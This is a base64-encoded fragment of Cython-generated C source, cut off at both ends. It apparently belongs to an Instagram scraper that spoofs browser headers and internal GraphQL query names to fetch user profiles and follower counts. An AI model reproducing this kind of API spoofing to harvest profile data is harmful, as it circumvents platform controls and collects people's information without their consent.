KzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19weXhfdF8yID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKChQeU9iamVjdCopX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfMTIpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzc1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF83ID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8sIF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM3NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19weXhfdl9sc2RfdG9rZW4gPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMTApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNzgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWNjZXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY2VwdF9sYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbl9lbl9VU19xXzBfOSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9jb250ZW50X3R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGVfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3JpZ2luLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX3d3d19pbnN0YWdyYW1fY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHJpb3JpdHksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdV8xX2kpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcmVyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2NyaXN0aWFuKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3OCwgX19weXhfTDNfZXJyb3IpXG5cbiAgICAgIFxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91c2VyX2FnZW50LCBfX3B5eF92X3VzZXJfYWdlbnQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfeF9mYl9mcmllbmRseV9uYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUG9sYXJpc1VzZXJIb3ZlckNhcmRDb250ZW50VjJRdWUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc4LCBfX3B5eF9MM19lcnJvcilcblxuICAgICAgXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3hfZmJfbHNkLCBfX3B5eF92X2xzZF90b2tlbikgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19weXhfdl9oZWFkZXJzID0gKChQeU9iamVjdCopX19weXhfdF83KTtcbiAgICAgIF9fcHl4X3RfNyA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzOTAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbHNkLCBfX3B5eF92X2xzZF90b2tlbikgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZiX2FwaV9jYWxsZXJfY2xhc3MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SZWxheU1vZGVybikgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BvbGFyaXNVc2VySG92ZXJDYXJkQ29udGVudFYyUXVlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM5MCwgX19weXhfTDNfZXJyb3IpXG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMiA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pzb24pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzOTMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2R1bXBzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzkzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM5MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VySUQsIF9fcHl4X3ZfdXNlcl9pZCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY3Jpc3RpYW5vKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM5MywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF90XzMgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfOCkpKSB7XG4gICAgICAgIF9fcHl4X3RfMTIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzgpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF8xMik7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzgsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfMyA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTIsIF9fcHl4X3RfMX07XG4gICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF84LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzOTMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIH1cbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YXJpYWJsZXMsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VydmVyX3RpbWVzdGFtcHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90cnVlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM5MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZG9jX2lkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91Xzc3MTcyNjk0ODgzMzYwMDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzkwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fcHl4X3ZfZGF0YSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzcgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMiA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzk3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzk3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8zID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEpKSkge1xuICAgICAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF8yKTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzMgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAzIDogMCldID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc193d3dfaW5zdGFncmFtX2NvbV9hcGlfZ3JhcH07XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMyk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM5NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lb3V0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoKFB5T2JqZWN0KilfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM5NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgfVxuICAgICAgX19weXhfdl9yZXNwb25zZSA9IF9fcHl4X3RfNztcbiAgICAgIF9fcHl4X3RfNyA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3ZfcmVzcG9uc2U7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX3B5eF90XzMgPSAwO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgxLV9fcHl4X3RfMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAzOTksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICB9XG4gICAgICBfX3B5eF90XzIgPSBfX3B5eF90XzEyO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX3B5eF90XzExID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMzk5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgIF9fcHl4X3RfMyA9IDA7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF90XzExfTtcbiAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgzLV9fcHl4X3RfMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAzOTksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfMSA9IF9fcHl4X3RfODtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDM5OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICBfX3B5eF90XzMgPSAwO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlciwgX19weXhfdF8xMn07XG4gICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMy1fX3B5eF90XzMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM5OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgfVxuICAgICAgX19weXhfdl91c2VyX2luZm8gPSBfX3B5eF90Xzc7XG4gICAgICBfX3B5eF90XzcgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl91c2VyX2luZm8sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDAwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX3B5eF92X3VzZXJuYW1lID0gX19weXhfdF84O1xuICAgICAgX19weXhfdF84ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3ZfdXNlcm5hbWUpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTMgPCAwKSkpIF9fUFlYX0VSUigwLCA0MDIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fcHl4X3RfMTMpIHtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmZvaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KChQeU9iamVjdF9TZXRJdGVtKF9fcHl4X3RfOCwgX19weXhfdl91c2VybmFtZSwgX19weXhfdl91c2VyX2luZm8pIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl91c2VyX2luZm8sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzZdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdF83KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBfX3B5eF92X2ZvbGxvd2VyX2NvdW50ID0gKChQeU9iamVjdCopX19weXhfdF84KTtcbiAgICAgICAgX19weXhfdF84ID0gMDtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3VzZXJfaW5mbywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQwNSwgX19weXhfTDNfZX